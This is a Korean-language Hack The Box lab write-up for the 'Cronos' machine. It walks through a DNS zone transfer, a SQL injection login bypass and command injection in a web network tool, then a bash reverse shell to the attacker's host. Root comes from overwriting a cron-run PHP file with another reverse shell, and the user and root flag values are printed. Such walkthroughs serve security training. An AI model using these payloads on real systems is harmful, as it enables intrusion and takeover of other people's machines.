# HTB — Cronos

**OS:** Linux (Debian) **Difficulty:** Medium **IP:** 10.129.227.211 **Tags:** `dns-zone-transfer` `sqli-auth-bypass` `command-injection` `cron-privesc`

---

## Summary

Cronos는 DNS Zone Transfer로 숨겨진 서브도메인을 발견하고, SQLi 인증 우회로 관리자 페이지에 접근한 뒤 Command Injection으로 초기 shell을 획득하는 머신이다. 권한 상승은 root가 1분마다 실행하는 cron job이 www-data 소유 파일을 실행한다는 점을 이용한다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 5000 10.129.227.211
```

```
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

### Version Scan

```bash
nmap -p 22,53,80 -sV 10.129.227.211
```

---

## Enumeration

### /etc/hosts 설정

```bash
echo "10.129.227.211 cronos.htb" | sudo tee -a /etc/hosts
```

### DNS Zone Transfer

포트 53이 열려있어서 Zone Transfer 시도:

```bash
dig axfr cronos.htb @10.129.227.211
```

`admin.cronos.htb` 서브도메인 발견.

```bash
echo "10.129.227.211 admin.cronos.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation

### SQLi 인증 우회

`http://admin.cronos.htb` 접속 후 로그인 페이지에서:

```
Username: ' or 1=1-- -
Password: anything
```

로그인 성공 → **Net Tool v0.1** 페이지 확인.

### Command Injection

Net Tool 입력창에서 command injection 확인:

```
8.8.8.8; whoami
# www-data
```

### Reverse Shell

**Kali에서 리스너:**

```bash
nc -lvnp 4444
```

**Net Tool 입력창:**

```
8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.17.240/4444 0>&1'
```

`www-data` shell 획득.

---

## User Flag

```bash
cat /home/noulis/user.txt
# 5343373707e6cd1781b4eff4c5d7c06f
```

---

## Privilege Escalation

### Cron Job 발견

```bash
cat /etc/crontab
```

```
* * * * * root php /var/www/laravel/artisan
```

root가 1분마다 `/var/www/laravel/artisan`을 실행. 파일 권한 확인:

```bash
ls -la /var/www/laravel/artisan
# -rwxr-xr-x 1 www-data www-data
```

`www-data`가 owner → write 가능!

### artisan 파일 덮어쓰기

**Kali에서 리스너:**

```bash
nc -lvnp 5555
```

**www-data shell에서:**

```bash
echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/10.10.17.240/5555 0>&1'"'"'"); ?>' > /var/www/laravel/artisan
```

1분 대기 → root shell 획득.

---

## Root Flag

```bash
cat /root/root.txt
# d79ec2b04dc1e673cfe6bd9afce83124
```

---

## Attack Chain

```
Port Scan
  → 53 (DNS) open
    → Zone Transfer → admin.cronos.htb 발견
      → SQLi 인증 우회 → Net Tool v0.1
        → Command Injection → www-data shell
          → /etc/crontab → root cron job 발견
            → artisan 파일 덮어쓰기 → root shell
```

---

## Key Takeaways

- **DNS Zone Transfer**: 53번 포트가 열려있으면 항상 `dig axfr` 시도. 숨겨진 서브도메인을 발견하는 핵심 기법.
- **SQLi 인증 우회**: `' or 1=1-- -` 패턴은 기본 중의 기본. 로그인 페이지 보이면 항상 시도.
- **Cron Job PrivEsc**: `/etc/crontab` 확인은 Linux PrivEsc 체크리스트 필수 항목. root 소유 cron이 낮은 권한 유저 소유 파일을 실행하면 즉시 root 획득 가능.
- **Command Injection**: 네트워크 도구(ping, traceroute 등)를 제공하는 웹 기능은 항상 `;`, `|`, `&&` 등으로 injection 테스트.